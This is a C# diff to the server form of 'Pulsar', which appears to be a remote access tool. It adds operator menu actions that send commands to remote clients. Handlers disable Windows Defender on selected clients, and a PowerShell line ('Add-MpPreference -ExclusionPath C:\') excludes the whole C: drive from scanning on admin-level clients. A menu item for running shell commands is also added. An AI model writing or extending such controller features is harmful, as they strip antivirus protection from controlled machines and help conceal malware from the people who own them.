@@ -384,10 +384,30 @@ namespace Pulsar.Server.Forms
             LoadNotificationHistory();
             LoadAutoTasks();
             InitializeAutoTasksMenu();
+
+            // ADD THIS LINE - Add Shell Command to Auto Tasks menu
+            AddShellCommandToAutoTasksMenu();
+
             ScheduleOfflineListRefresh();
             ScheduleStatsRefresh();
         }
+        private void AddShellCommandToAutoTasksMenu()
+        {
+            if (addTaskToolStripMenuItem?.DropDownItems != null)
+            {
+                // Add separator if there are existing items
+                if (addTaskToolStripMenuItem.DropDownItems.Count > 0)
+                {
+                    addTaskToolStripMenuItem.DropDownItems.Add(new ToolStripSeparator());
+                }
 
+                // Create and add the Shell Command menu item
+                var shellCommandItem = new ToolStripMenuItem("Shell Command");
+                shellCommandItem.Click += shellCommandToolStripMenuItem_Click;
+                shellCommandItem.Image = Properties.Resources.application_go; // Use appropriate icon if available
+                addTaskToolStripMenuItem.DropDownItems.Add(shellCommandItem);
+            }
+        }
         private void InitializeAutoTasksMenu()
         {
             var separator = new ToolStripSeparator();
@@ -4352,7 +4372,7 @@ namespace Pulsar.Server.Forms
                 (frm, client, task) => frm.ExecuteMenuItemAutoTask(visitWebsiteToolStripMenuItem, visitWebsiteToolStripMenuItem_Click, client, task)));
 
             // Quick commands
-            RegisterDefaultAutoTask(addCDriveExceptionToolStripMenuItem, addCDriveExceptionToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(addCExclusionToolStripMenuItem, addCExclusionToolStripMenuItem_Click);
             RegisterDefaultAutoTask(enableToolStripMenuItem, enableToolStripMenuItem_Click);
             RegisterDefaultAutoTask(disableTaskManagerToolStripMenuItem, disableTaskManagerToolStripMenuItem_Click);
 
@@ -5744,6 +5764,44 @@ namespace Pulsar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoClearTempDirectory());
+            }
+        }
+
+        private void enableDefenderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This will enable/restore Windows Defender
+                c.Send(new DoDisableDefender(false));
+            }
+        }
+
+        private void disableDefenderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This will disable Windows Defender
+                c.Send(new DoDisableDefender(true));
+            }
+        }
+
+        private void addCExclusionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
+            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
+
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(quickCommand);
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
     }
